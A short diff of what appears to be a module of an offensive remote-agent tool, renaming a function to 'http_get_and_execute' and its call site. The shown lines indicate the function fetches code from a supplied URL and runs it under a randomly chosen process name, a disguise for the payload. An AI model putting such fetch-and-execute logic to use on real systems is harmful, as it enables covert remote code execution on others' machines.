@@ -11,7 +11,7 @@ def get_parent_process(process_name):
             return cur_proc['ppid']
 
 
-def http_get_andcute(url):
+def http_get_and_execute(url):
     # Get random process name
     platform = sys.get_os()["platform"]
     proc_name = PROC_NAMES[platform][random.int(
@@ -66,4 +66,4 @@ def http_get_andcute(url):
         return
 
 
-http_get_andcute(input_params['url'])
+http_get_and_execute(input_params['url'])
